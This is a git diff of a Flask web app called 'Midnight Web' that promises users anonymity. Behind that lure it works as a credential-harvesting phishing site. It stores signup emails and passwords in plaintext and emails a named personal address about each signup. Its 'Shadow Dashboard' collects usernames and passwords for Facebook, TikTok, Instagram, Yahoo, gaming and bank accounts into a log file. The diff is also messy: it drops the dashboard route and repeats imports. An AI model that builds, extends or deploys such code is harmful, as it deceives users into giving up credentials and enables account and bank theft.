@@ -1,6 +1,6 @@
 from flask import Flask, render_template, render_template_string, request, redirect
 from flask_login import LoginManager, login_user, logout_user, login_required, UserMixin, current_user
-
+from flask import Flask, render_template, render_template_string, request, redirect, flash
 from flask_mail import Mail, Message
 from dotenv import load_dotenv
 import os
@@ -52,11 +52,122 @@ def login():
 from flask_login import login_required, current_user
 
 from flask_login import login_required, current_user
+("""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Shadow Dashboard - Midnight</title>
+        <style>
+            body {
+                background-color: #121212;
+                color: #cccccc;
+                font-family: 'Courier New', monospace;
+                text-align: center;
+                padding: 50px;
+            }
+            h2 {
+                font-size: 2.5em;
+                margin-bottom: 10px;
+            }
+            .account-options {
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 20px;
+            }
+            .account {
+                background-color: #1e1e1e;
+                border: 1px solid #333;
+                border-radius: 8px;
+                padding: 20px;
+                width: 150px;
+                cursor: pointer;
+                transition: 0.3s;
+            }
+            .account:hover {
+                background-color: #333;
+                color: white;
+            }
+            .form-container {
+                margin-top: 40px;
+                display: none;
+                max-width: 400px;
+                margin-left: auto;
+                margin-right: auto;
+                background: #1e1e1e;
+                padding: 20px;
+                border-radius: 8px;
+                text-align: left;
+            }
+            input {
+                width: 100%;
+                padding: 10px;
+                margin: 8px 0;
+                border: none;
+                border-radius: 4px;
+            }
+            input[type="submit"] {
+                background-color: #444;
+                color: white;
+                cursor: pointer;
+            }
+        </style>
+    </head>
+    <body>
 
-@app.route("/dashboard")
-@login_required
-def dashboard():
-    return render_template("dashboard.html")
+        <!-- ✅ Flash messages section -->
+        {% with messages = get_flashed_messages() %}
+        {% if messages %}
+            <div style="background:#1e1e1e; color:#00ffcc; padding:10px; border-radius:5px; margin-bottom:20px;">
+                {% for message in messages %}
+                    <p>{{ message }}</p>
+                {% endfor %}
+            </div>
+        {% endif %}
+        {% endwith %}
+
+        <h2>🕶️ Shadow Dashboard</h2>
+        <p>Welcome, {{ current_user.email }} — your operation is secured.</p>
+        <p><strong>IP masked. Inbuilt proxy active.</strong></p>
+
+        <div class="account-options">
+            <div class="account" onclick="showForm('facebookForm')">Facebook</div>
+            <div class="account" onclick="showForm('tiktokForm')">TikTok</div>
+            <div class="account" onclick="showForm('instagramForm')">Instagram</div>
+            <div class="account" onclick="showForm('yahooForm')">Yahoo</div>
+            <div class="account" onclick="showForm('gamingForm')">Gaming</div>
+            <div class="account" onclick="showForm('bankForm')">Bank</div>
+        </div>
+
+        {% for platform in ['facebook', 'tiktok', 'instagram', 'yahoo', 'gaming', 'bank'] %}
+        <div class="form-container" id="{{ platform }}Form">
+            <h3>Link {{ platform.capitalize() }} Account</h3>
+            <form action="/link_{{ platform }}" method="POST">
+                <label>Username or Email:</label><br>
+                <input type="text" name="{{ platform }}_user" placeholder="your_username" required><br>
+                <label>Password:</label><br>
+                <input type="password" name="{{ platform }}_password" placeholder="Enter password" required><br>
+                <input type="submit" value="Link Account">
+            </form>
+        </div>
+        {% endfor %}
+
+        <br><br>
+        <form action="/logout" method="POST">
+            <input type="submit" value="Logout" style="background-color:#222; padding:10px 20px; border:none; color:#fff; border-radius:5px;">
+        </form>
+
+        <script>
+            function showForm(id) {
+                document.getElementById(id).style.display = "block";
+                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+            }
+        </script>
+    </body>
+    </html>
+    """)
+
+
 
 
 @app.route("/logout")
@@ -140,11 +251,15 @@ def submit():
     email = request.form["email"]
     password = request.form["password"]
 
+    # ✅ Register the user in memory so they can log in later
+    if email not in users:
+        users[email] = User(id=str(len(users) + 1), email=email, password=password)
+
     # Save to file
     with open("submitted_data.txt", "a", encoding="utf-8") as f:
         f.write(f"Email: {email}, Password: {password}\n")
 
-    # ✅ Send confirmation email to the user
+    # Send email to user
     msg_to_user = Message(
         subject="Welcome to Midnight Web",
         recipients=[email],
@@ -152,7 +267,7 @@ def submit():
     )
     mail.send(msg_to_user)
 
-    # ✅ Send alert email to yourself
+    # Alert you (admin)
     msg_to_you = Message(
         subject="New Midnight Web Signup",
         recipients=["isiemmanuel83@gmail.com"],
@@ -160,8 +275,14 @@ def submit():
     )
     mail.send(msg_to_you)
 
-    return redirect("/success")
+    # Final redirect to success page
+    return redirect("/login")
 
+
+
+from flask_login import login_required, current_user
+
+from flask_login import login_required
 
 @app.route("/success")
 def success():
@@ -169,121 +290,57 @@ def success():
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Shadow Link - Midnight</title>
+        <title>Success - Midnight Web</title>
         <style>
             body {
                 background-color: #121212;
-                color: #00ffcc;
+                color: #cccccc;
                 font-family: 'Courier New', monospace;
                 text-align: center;
                 padding: 50px;
             }
-            h2 {
-                font-size: 2.5em;
-                margin-bottom: 10px;
-            }
-            p {
-                color: #bbbbbb;
-                font-size: 1.2em;
-                margin-bottom: 30px;
-            }
-            .account-options {
-                display: flex;
-                flex-wrap: wrap;
-                justify-content: center;
-                gap: 20px;
-            }
-            .account {
+            .message-box {
                 background-color: #1e1e1e;
-                border: 1px solid #333;
-                border-radius: 8px;
-                padding: 20px;
-                width: 150px;
-                cursor: pointer;
-                transition: 0.3s;
-            }
-            .account:hover {
-                background-color: #1e88e5;
-                color: white;
-            }
-            .form-container {
+                padding: 30px;
+                border-radius: 10px;
+                display: inline-block;
                 margin-top: 40px;
-                display: none;
-                max-width: 400px;
-                margin-left: auto;
-                margin-right: auto;
-                background: #1e1e1e;
-                padding: 20px;
-                border-radius: 8px;
-                box-shadow: 0 0 10px #00000099;
-                text-align: left;
             }
-            input {
-                width: 100%;
-                padding: 10px;
-                margin: 8px 0;
-                border: none;
-                border-radius: 4px;
-            }
-            input[type="submit"] {
-                background-color: #1e88e5;
-                color: white;
-                cursor: pointer;
+            a {
+                color: #1e88e5;
+                text-decoration: underline;
+                display: inline-block;
+                margin-top: 20px;
             }
         </style>
     </head>
     <body>
-        <h2>✅ You are now in the shadows</h2>
-        <p>
-            Link up desired accounts to stay informed and work under the radar.<br>
-            <strong>IP masked. Inbuilt proxy active.</strong>
-        </p>
-
-        <div class="account-options">
-            <div class="account" onclick="showForm('facebookForm')">Facebook</div>
-            <div class="account" onclick="showForm('tiktokForm')">TikTok</div>
-            <div class="account" onclick="showForm('instagramForm')">Instagram</div>
-            <div class="account" onclick="showForm('yahooForm')">Yahoo</div>
-            <div class="account" onclick="showForm('gamingForm')">Gaming</div>
-            <div class="account" onclick="showForm('bankForm')">Bank</div>
+        <div class="message-box">
+            <h2>✅ Welcome to Midnight Web</h2>
+            <p>You're now inside the shadows.<br>Log in to start linking your accounts securely.</p>
+            <a href="/login">🔐 Go to Login</a>
         </div>
-
-        <!-- Forms -->
-        {% for platform in ['facebook', 'tiktok', 'instagram', 'yahoo', 'gaming', 'bank'] %}
-        <div class="form-container" id="{{ platform }}Form">
-            <h3>Link {{ platform.capitalize() }} Account</h3>
-            <form action="/link_{{ platform }}" method="POST">
-                <label>Username or Email:</label><br>
-                <input type="text" name="{{ platform }}_user" placeholder="your_username" required><br>
-                <label>Password:</label><br>
-                <input type="password" name="{{ platform }}_password" placeholder="Enter password" required><br>
-                <input type="submit" value="Link Account">
-            </form>
-        </div>
-        {% endfor %}
-
-        <br><br>
-        <a href="/" style="color:#00ffcc; text-decoration:underline;">⬅ Return to Midnight Web</a>
-
-        <script>
-            function showForm(id) {
-                document.getElementById(id).style.display = "block";
-                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
-            }
-        </script>
     </body>
     </html>
     """)
 
+
+
+from flask import flash  # add this at the top with other imports
+
 @app.route("/link_<platform>", methods=["POST"])
+@login_required
 def link_account(platform):
     user = request.form.get(f"{platform}_user")
     password = request.form.get(f"{platform}_password")
 
-    with open("linked_accounts.txt", "a") as f:
-        f.write(f"{platform.capitalize()} Username/Email: {user}, Password: {password}\n")
+    with open("linked_accounts.txt", "a", encoding="utf-8") as f:
+        f.write(f"{current_user.email} | {platform.capitalize()} | Username: {user} | Password: {password}\n")
 
-    return redirect("/linked")
+    flash(f"{platform.capitalize()} account linked successfully!")
+    return redirect("/dashboard")
+
+
 
 @app.route("/linked")
 def linked():
